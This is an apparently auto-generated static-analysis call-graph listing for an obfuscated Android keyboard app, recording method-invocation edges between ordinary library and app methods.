SPECIAL edge: specialinvoke $r0.<lwg: void <init>()>() in <lwh: void <clinit>()> ==> <lwg: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<gbk: void <init>(int)>(18) in <ivw: void <clinit>()> ==> <gbk: void <init>(int)>
INTERFACE edge: $r6 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<java.lang.StringBuilder: void <init>()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, 0) in <lvr: void <init>(java.util.List)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r8.<lup: void <init>(lwc,java.lang.String)>($r9, $r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lup: void <init>(lwc,java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <nzh: java.lang.String c()> ==> <java.lang.String: void <init>(char[],int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>()>
VIRTUAL edge: $r9 = virtualinvoke r0.<lsn: lwc a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsd: lwc a()>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
CLINIT edge: staticinvoke <iej: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iej: void <clinit>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsc: java.lang.String e()>() in <lsh: lse h(java.util.logging.Level)> ==> <lsc: java.lang.String e()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lkx: boolean containsKey(java.lang.Object)> ==> <lqk: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>() in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, $i2, $r8, $i3, $i5) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r29.<mag: void <init>(java.lang.String,int,int)>("TENOR_STATIC_IMAGE", 29, 29) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ivv: ivw b(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivv: ivw b(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <liz: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: java.lang.Object e(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(6) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Cannot find field:") in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(8) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(8) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r1, $r3) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Float: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Float: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(0) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(9) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r6.<java.lang.Enum: int ordinal()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int ordinal()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: staticinvoke <java.util.Collections: void sort(java.util.List)>($r3) in <ivv: ivw a()> ==> <java.util.Collections: void sort(java.util.List)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "injected class name is empty") in <lsh: lsh j(java.lang.String)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<liz: java.lang.Object a(int)>($i0) in <liz: java.lang.Object next()> ==> <liw: java.lang.Object a(int)>
SPECIAL edge: $i0 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
SPECIAL edge: specialinvoke r0.<lsd: void <init>(java.util.logging.Level)>($r2) in <lsf: void <init>(lsh,java.util.logging.Level)> ==> <lsd: void <init>(java.util.logging.Level)>
STATIC edge: $r6 = staticinvoke <ivw: ivw f(java.lang.String)>("zz") in <hnt: void <clinit>()> ==> <ivw: ivw f(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r10.<java.lang.Throwable: java.lang.Throwable getCause()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.Throwable: java.lang.Throwable getCause()>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: void <init>()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
SPECIAL edge: specialinvoke $r0.<lqk: void <init>()>() in <lqk: void <clinit>()> ==> <lqk: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char[] toCharArray()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lsn: lsw i(lsq)>($r4) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsn: lsw i(lsq)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(3) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: void setLength(int)>(0) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: void setLength(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>(ivv,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: $i0 = specialinvoke r0.<java.util.AbstractMap: int hashCode()>() in <lvr: int hashCode()> ==> <java.util.AbstractMap: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void e(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void e(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gcs: void <init>(hbv,lma,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lsn: void ab(java.lang.String,java.lang.Object[])>($r1, $r4) in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: void ab(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<liy: void <init>(ljd)>(r0) in <ljd: java.util.Set entrySet()> ==> <liy: void <init>(ljd)>
SPECIAL edge: specialinvoke $r0.<lkm: void <init>(lkq,int)>($r1, 0) in <lkq: void <clinit>()> ==> <lkm: void <init>(lkq,int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r1, 0) in <lqq: void <clinit>()> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r4.<oru: void <init>()>() in <ose: void <clinit>()> ==> <oru: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lly: lma g()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String b()>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r1, $i0) in <qj: int b(java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lkl: lkq g()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r3.<ltc: void <init>(java.lang.String,int,int)>("LARGE", 2, 50) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r1.<gsv: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <gsv: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Object: java.lang.Class getClass()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(19) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <lkq: lkq q()>() in <lqs: void <clinit>()> ==> <lkq: lkq q()>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(12) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lje: void a()>() in <lje: java.lang.Object next()> ==> <lje: void a()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
CLINIT edge: staticinvoke <java.util.Locale: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.Locale: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <ivw: boolean z(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<hcb: void <init>()>() in <hcb: void <clinit>()> ==> <hcb: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsm: java.lang.Object d(lsz)>
STATIC edge: $r0 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq g(java.lang.Object[])> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>(int)>(3) in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 97, 122, $i2) in <iwt: void g(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", parameter ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <mag: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r4.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_FULL_IMAGE", 4, 4) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lli: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <android.util.Base64: java.lang.String encodeToString(byte[],int)>($r1, 3) in <kes: java.lang.String k(nfe)> ==> <android.util.Base64: java.lang.String encodeToString(byte[],int)>
SPECIAL edge: specialinvoke r0.<ljb: void a()>() in <ljb: java.lang.Object getValue()> ==> <ljb: void a()>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <hbw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbw: void <clinit>()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lta: void <init>(lsr,java.lang.Object)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <hcb: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hcb: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lvq: int b()>() in <lvq: int size()> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <lsm: void <init>()> ==> <lts: void <init>()>
SPECIAL edge: specialinvoke $r27.<mag: void <init>(java.lang.String,int,int)>("TENOR_FEATURED_METADATA", 27, 27) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ivv: java.lang.String c()>() in <ivv: ivw a()> ==> <ivv: java.lang.String c()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lup: void <init>(lwc,java.lang.String)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <ojg: void v(java.lang.String)>($r1) in <ojg: void d(java.lang.Object,java.lang.String)> ==> <ojg: void v(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lkl: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>($r3) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(1) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $i8 = interfaceinvoke $r14.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r9, $r15) in <lvr: void <init>(lvr,lvr)> ==> <jlu: int compare(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_ImeListLoaded", $r4) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfc: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.StringBuilder: int length()>() in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: int length()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, $i4) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r5, $i0) in <lvr: void <init>(lvr,lvr)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
CLINIT edge: staticinvoke <hfd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hfd: void <clinit>()>
INTERFACE edge: $r7 = interfaceinvoke $r2.<ltn: lsq f()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: lsq f()>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.Throwable: void <init>()>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r1 = staticinvoke <lri: java.util.ArrayList N()>() in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <lri: java.util.ArrayList N()>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.LinkageError: void <init>()> ==> <java.lang.Error: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jvu: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>($r1, $r2, $r3, $r6) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(4) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r4, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(float[],float[])>($r14, $r15) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(float[],float[])>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqm: int size()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
